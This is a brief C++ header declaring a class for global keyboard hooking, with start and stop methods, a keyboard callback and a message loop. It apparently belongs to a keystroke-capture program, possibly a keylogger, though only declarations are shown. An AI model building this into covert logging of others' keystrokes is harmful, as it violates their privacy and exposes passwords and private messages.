#pragma once
#include "KeyList.h"
#include "SpecialKeys.h"
#include <iostream>
#include <fstream>
#include <string>

class KeyboardHooking // for global keyboard hooking
{
public:
	void StartKeyboardHooking();
	void StopKeyboardHooking();

	//to be run for hooking the key
	static LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);

	 //the loop for getting messages
	static void MsgLoop();
};


